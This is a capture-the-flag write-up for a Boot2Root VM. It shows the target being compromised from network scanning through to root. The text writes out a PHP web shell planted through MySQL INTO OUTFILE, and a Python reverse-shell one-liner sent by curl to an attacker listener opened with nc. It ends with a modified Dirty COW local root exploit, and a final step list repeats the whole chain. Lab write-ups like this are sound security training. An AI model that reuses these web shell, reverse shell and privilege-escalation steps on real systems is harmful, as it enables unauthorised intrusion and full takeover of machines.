### Boot2Root

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/1.png)

#### Find IP of Guest Os
Let's gather information about my network

```sh
ip addr show
```

```
2: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 98:3b:8f:84:d6:f9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.8/24 brd 192.168.100.255 scope global dynamic noprefixroute wlp2s0
       valid_lft 84413sec preferred_lft 84413sec
    inet6 fe80::6f98:63db:cb47:f119/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```

From the IP address `192.168.100.8/24`, we can deduce a subnet mask of `255.255.255.0`, which
tells us the available address range is `192.168.100.0-192.168.100.255`. let's use nmap to scan
for all devices within this range.

```sh
nmap 192.168.100.0-255
```
or
```sh
nmap 192.168.100.0/24
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-14 09:29 +01
Nmap scan report for 192.168.100.1
Host is up (0.0093s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   filtered ssh
23/tcp   filtered telnet
53/tcp   open     domain
80/tcp   open     http
8022/tcp filtered oa-system

Nmap scan report for 192.168.100.4
Host is up (0.0042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5000/tcp open  upnp
7000/tcp open  afs3-fileserver

Nmap scan report for 192.168.100.8
Host is up (0.00022s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.100.13
Host is up (0.0029s latency).
All 1000 scanned ports on 192.168.100.13 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 192.168.100.14
Host is up (0.00015s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (5 hosts up) scanned in 23.68 seconds
```

There are 5 devices detected. I know that it's not `192.168.100.8` since that's the host. After
stopping the guest and running the scan again, I discoverd the device is `192.168.100.14`. BTW
while experimenting, I noticed this.

```sh
nmap -sT -p 80,443 192.168.100.0/24
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-14 09:47 +01
Nmap scan report for 192.168.100.1
Host is up (0.0031s latency).

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
MAC Address: 14:46:58:5F:8A:BA (Huawei Technologies)

Nmap scan report for 192.168.100.4
Host is up (0.0051s latency).

PORT    STATE  SERVICE
80/tcp  closed http
443/tcp closed https
MAC Address: F4:D4:88:8B:D4:F0 (Apple)

Nmap scan report for 192.168.100.13
Host is up (0.056s latency).

PORT    STATE  SERVICE
80/tcp  closed http
443/tcp closed https
MAC Address: 2E:4D:2C:50:64:07 (Unknown)

Nmap scan report for 192.168.100.14
Host is up (0.00025s latency).

PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:AF:76:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.100.8
Host is up (0.000039s latency).

PORT    STATE  SERVICE
80/tcp  closed http
443/tcp closed https

Nmap done: 256 IP addresses (5 hosts up) scanned in 2.29 seconds
```

**"PCS Systemtechnik/Oracle VirtualBox virtual NIC"**
so I'm confident that it is
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/2.png)

```sh
nmap -sT 192.168.100.14
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-14 09:50 +01
Nmap scan report for 192.168.100.14
Host is up (0.00015s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
MAC Address: 08:00:27:AF:76:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

Now, I'm not sure what to do next. this is just a simple HTML page. Are there any other subpages,
like `192.168.100.14/subpage`? we can use nmap to find that information.

```sh
nmap --script http-enum 192.168.100.14
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-14 11:07 +01
Nmap scan report for 192.168.100.14
Host is up (0.00019s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
| http-enum:
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|_  /webmail/images/sm_logo.png: SquirrelMail
993/tcp open  imaps
MAC Address: 08:00:27:AF:76:C1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
```

let's take a look there

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/3.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/4.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/5.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/6.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/7.png)

while browsing i see this

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/8.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/9.png)

Let's take a look at the log, and keep in mind that this is related to the *lmezard* user.

I copied the log into a file called *test* and ran the following command.

```sh
cat test | grep password | awk -v n=9 '{for (i=n; i <=NF; ++i) printf $i " "; print ""}'
```

```
invalid user test from 161.202.39.38 port 53781 ssh2
invalid user user from 161.202.39.38 port 54109 ssh2
invalid user admin from 161.202.39.38 port 54501 ssh2
invalid user PlcmSpIp from 161.202.39.38 port 54827 ssh2
root from 161.202.39.38 port 55193 ssh2
root from 161.202.39.38 port 55547 ssh2
invalid user pi from 161.202.39.38 port 56275 ssh2
invalid user test from 161.202.39.38 port 56630 ssh2
invalid user admin from 161.202.39.38 port 57011 ssh2
invalid user nvdb from 161.202.39.38 port 57329 ssh2
invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
invalid user admin from 104.245.98.119 port 22717 ssh2
root from 104.245.98.119 port 23400 ssh2
invalid user guest from 104.245.98.119 port 24338 ssh2
invalid user ubnt from 104.245.98.119 port 24710 ssh2
invalid user support from 104.245.98.119 port 25965 ssh2
invalid user test from 104.245.98.119 port 27190 ssh2
invalid user user from 104.245.98.119 port 27769 ssh2
invalid user admin from 104.245.98.119 port 28290 ssh2
invalid user PlcmSpIp from 104.245.98.119 port 29308 ssh2
root from 104.245.98.119 port 29799 ssh2
root from 104.245.98.119 port 29922 ssh2
invalid user ftpuser from 104.245.98.119 port 30401 ssh2
invalid user pi from 104.245.98.119 port 30558 ssh2
invalid user test from 104.245.98.119 port 31167 ssh2
invalid user admin from 104.245.98.119 port 32271 ssh2
invalid user naos from 104.245.98.119 port 32805 ssh2
invalid user adm from 104.245.98.119 port 33503 ssh2
root from 151.20.14.253 port 54939 ssh2
invalid user admin from 46.159.82.56 port 38179 ssh2
admin from 62.210.32.157 port 61495 ssh2
admin from 62.210.32.157 port 56050 ssh2
admin from 62.210.32.157 port 60098 ssh2
admin from 62.210.32.157 port 50755 ssh2
admin from 62.210.32.157 port 54025 ssh2
admin from 62.210.32.157 port 64745 ssh2
admin from 62.210.32.157 port 54511 ssh2
admin from 62.210.32.157 port 51320 ssh2
admin from 62.210.32.157 port 56349 ssh2
admin from 62.210.32.157 port 54915 ssh2
admin from 62.210.32.157 port 60970 ssh2
admin from 62.210.32.157 port 56754 ssh2
```

There's something strange: *!q\\]Ej?\*5K5cy\*AJ*. A password perhaps? Well, let's give it a try

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/10.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/11.png)

Let's take a look inside the website

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/12.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/13.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/15.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/14.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/16.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/17.png)

As you can see, we were able to log in as *lmezard*. Now, let's go back and see where we are.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/18.png)
#### What We Know
- **Guest IP:** 192.168.100.14

#### User
- **name:** lmezard
- **Password:** (for forum only) is *!q\\]Ej?\*5K5cy\*AJ*
- **Email:** laurie@borntosec.net

Maybe I can use this email to log in somewhere else.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/19.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/20.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/29.png)

**INBOX, INBOX.Drafts..** all empty


#### What Can Be Done and What I Can't Do for Now
- connect via ssh
- login to phpmyadmin

while looking around

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/21.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/22.png)

From the message, we can see that the database credentials are *root/Fg-'kKXBj87E:aJ$*.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/23.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/24.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/25.png)

I've tried different places, but haven't had any luck so far.

here's more info at *https://192.168.100.14/phpmyadmin/index.php?db=forum_db&token=de13e0659b2761e0e8d75a747e160ad7*
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/26.png)

user_pw is hashed, so no luck there either.

- admin@borntosec.net
- qudevide@borntosec.net
- thor@borntosec.net
- wandre@borntosec.net
- laurie@borntosec.net
- zaz@borntosec.net

We might be able to run some SQL commands. perhaps through *SQL injection*?

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/27.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/28.png)

After experimenting for a while, you can see that we are able to interact with the database.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/30.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/31.png)

Since we see phpMyAdmin and MySQL related content, I believe the backend is developed in PHP. 
Additionally, the URLs look like this:

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/32.png)

Since the *webmail.php* file is running on the server, I wonder if modifying it could give me 
access. Why not try inserting a PHP file and filling it with what I need? while searching, I 
discoverd that I can write to a file like this:

```sql
select "what you want to write" into outfile "/path/to/filename";
```

Let's give it a try.

```sql
select "something to test with" into outfile "/var/www/test.php";
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/33.png)

Oops, it seems there's a permission issue.

I tried other locations manually, like accessing */var/www/forum/test.php*, but encountered the 
same problem. Therefore, I decided to perform a brute-force test, but first, I need to find the 
folders. So, I decided to use the following `ffuf` with wordlist from `https://github.com/danielmiessler/SecLists.git`

```sh
git clone https://github.com/danielmiessler/SecLists.git --depth=1
cd SecLists/./Discovery/Web-Content/
ffuf -u https://192.168.100.14/FUZZ -w directory-list-2.3-medium.txt -recursion -recursion-depth 1 -of html -o test.html
```

And I saved the output locally for analysis.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/34.png)

I ran it again to obtain a different format that's easier to use with *grep*

```sh
ffuf -u https://192.168.100.14/FUZZ -w ./Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 1 -o test.json -of json -json true
```

more formatting on a website `https://jsonformatter.org/`

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/35.png)

let's extract the list of folders

```sh
cat test.json | grep https | grep -v FUZZ |grep -v \# | grep -v redirectlocation | awk '{print $2}' | awk -F'.' '{print $4}' | awk -F '/' '{print $2 "/" $3}' | awk -F '"' '{print $1}'
```

```
forum
webmail
phpmyadmin
server-status
forum/images
forum/themes
forum/modules
forum/includes
forum/update
forum/js
forum/lang
forum/config
forum/backup
forum/
forum/index
forum/
forum/templates_c
webmail/help
webmail/
webmail/images
webmail/themes
webmail/plugins
webmail/src
webmail/include
webmail/config
webmail/class
webmail/functions
webmail/po
webmail/locale
webmail/
phpmyadmin/themes
phpmyadmin/js
phpmyadmin/libraries
phpmyadmin/setup
phpmyadmin/locale
phpmyadmin/
phpmyadmin/pmd
phpmyadmin/
/
```

Now, I'm going to try all of them to see if we can write somewhere. Instead of trying each one
separately.

```sh
 for line in $(cat paths.txt); do echo select \"test\" into outfile \"/var/www/$line/injected_file.php\"";"; done
```

where paths.txt just the previous output

```
select "test" into outfile "/var/www/forum/injected_file.php";
select "test" into outfile "/var/www/webmail/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/injected_file.php";
select "test" into outfile "/var/www/server-status/injected_file.php";
select "test" into outfile "/var/www/forum/images/injected_file.php";
select "test" into outfile "/var/www/forum/themes/injected_file.php";
select "test" into outfile "/var/www/forum/modules/injected_file.php";
select "test" into outfile "/var/www/forum/includes/injected_file.php";
select "test" into outfile "/var/www/forum/update/injected_file.php";
select "test" into outfile "/var/www/forum/js/injected_file.php";
select "test" into outfile "/var/www/forum/lang/injected_file.php";
select "test" into outfile "/var/www/forum/config/injected_file.php";
select "test" into outfile "/var/www/forum/backup/injected_file.php";
select "test" into outfile "/var/www/forum//injected_file.php";
select "test" into outfile "/var/www/forum/index/injected_file.php";
select "test" into outfile "/var/www/forum//injected_file.php";
select "test" into outfile "/var/www/forum/templates_c/injected_file.php";
select "test" into outfile "/var/www/webmail/help/injected_file.php";
select "test" into outfile "/var/www/webmail//injected_file.php";
select "test" into outfile "/var/www/webmail/images/injected_file.php";
select "test" into outfile "/var/www/webmail/themes/injected_file.php";
select "test" into outfile "/var/www/webmail/plugins/injected_file.php";
select "test" into outfile "/var/www/webmail/src/injected_file.php";
select "test" into outfile "/var/www/webmail/include/injected_file.php";
select "test" into outfile "/var/www/webmail/config/injected_file.php";
select "test" into outfile "/var/www/webmail/class/injected_file.php";
select "test" into outfile "/var/www/webmail/functions/injected_file.php";
select "test" into outfile "/var/www/webmail/po/injected_file.php";
select "test" into outfile "/var/www/webmail/locale/injected_file.php";
select "test" into outfile "/var/www/webmail//injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/themes/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/js/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/libraries/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/setup/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/locale/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin//injected_file.php";
select "test" into outfile "/var/www/phpmyadmin/pmd/injected_file.php";
select "test" into outfile "/var/www/phpmyadmin//injected_file.php";
select "test" into outfile "/var/www///injected_file.php";
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/36.png)

Since I couldn't run all of them at once, I will try them one by one. After many trials.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/37.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/39.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/38.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/40.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/41.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/42.png)

You might have noticed that the IP has changed. Don't worry—it's because I added another VM 
instance. I'll perform the process again, as I can no longer write to the previous one.

```sql
select "<?php echo 'Command: ' . $_POST['cmd'] . '\n'; system($_POST['cmd']);?>" into outfile "/var/www/forum/templates_c/backdoor.php";
```
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/43.png)

now I can do this

```sh
curl  "https://192.168.100.16/forum/templates_c/backdoor.php" --insecure  --data-urlencode  "cmd=whoami; echo; ls -la"
```

BTW this is called
**WebShell:** is just backdoor but for web related stuff, that will allow us th execute commands
on the system i.e remote code execution here's nice video about it
`https://www.youtube.com/watch?v=iPmXu8XoCTI`

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/44.png)

Now, let's create a reverse shell so I can explore more easily.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/45.png)

As you can see, while attempting this, we encountered a problem: there's no *-e* option.

Since this method isn't working, I found a website that Offers various ways to obtain a reverse shell

`https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/`

I decided to use Python

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.100.8\",2000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'
```

```sh
curl "https://192.168.100.16/forum/templates_c/backdoor.php" --insecure  --data-urlencode  "cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.100.8\",2000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' "
```

BTW listener is already set like this

```sh
nc -l -vv -p 2000
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/46.png)
https://www.youtube.com/watch?v=bXCeFPNWjsM

```sh
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

I cannot access /etc/shadow, and even if I could, it likely wouldn't be helpful since I already 
tried cracking the hashes stored in the database.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/47.png)

but
```sh
uname -a
```
gives
```
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

which is very old for reference now it's at *6.11*, so old means it's vulnerable
so let's look for common CVEs `https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/version_id-478673/Linux-Linux-Kernel-3.2.html`

I couldn’t find it here—I haven’t looked extensively yet. So, I decided to use ExploitDB, 
specifically the command *searchsploit* kernel 3.2, to get a list of CVEs.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/48.png)

After some trials, I found this one:

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/49.png)

here's the c file "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/linux/local/40839.c?ref_type=heads"

The reverse shell I obtained doesn’t provide a user-friendly editor like Vim or Nano, so I did 
this:

```sh
echo '
c source code
' > test.c
gcc -pthread ./scripts/40839_mod.c -o dirty -lcrypt
./dirty 1234
```

I modified the source code slightly to remove the single quotes, so it doesn't end prematurely 
in the echo command.

and change firefart to root

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/50.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/51.png)

wait a bit

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/pics/52.png)


### Steps
#### IP Discovery
```sh
ip addr show
nmap 192.168.100.0/24
nmap -sT -p 80,443 192.168.100.0/24
```
#### Subpages
```sh
nmap --script http-enum 192.168.100.14
```

#### Credentials Of User 'lmezard'

```
https://192.168.100.16/forum/index.php?id=6
```
look there you will find !q\\]Ej?\*5K5cy\*AJ

#### Use 'lmezard' Credentials

```
https://192.168.100.16/forum/index.php?mode=login
```

#### Get More Info about 'lmezard'

```
https://192.168.100.16/forum/index.php?mode=user&action=edit_profile
```

email: *laurie@borntosec.net*

#### Use the email to log in to the webmail with the current password

```
https://192.168.100.16/webmail/src/login.php
```

#### In Webmail,Navigate to

```
https://192.168.100.16/webmail/src/webmail.php
```

And go DB Access

- username: root
- password:Fg-'kKXBj87E:aJ$

#### Log in to phpMyAdmin using root credentials and insert a PHP file for backdoor placement.

```sql
select "<?php echo 'Command: ' . $_POST['cmd'] . '\n'; system($_POST['cmd']);?>" into outfile "/var/www/forum/templates_c/backdoor.php";
```

#### Reverse shell and Listener

```sh
nc -l -vv -p 2000
```

```sh
curl "https://192.168.100.16/forum/templates_c/backdoor.php" --insecure  --data-urlencode  "cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.100.8\",2000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' "
```

#### Compile and Execute

```sh
echo '
c source code
' > test.c
gcc -pthread ./scripts/40839_mod.c -o dirty -lcrypt
./dirty 1234
```

#### Congratulation
now you can use *root* and *1234* to login
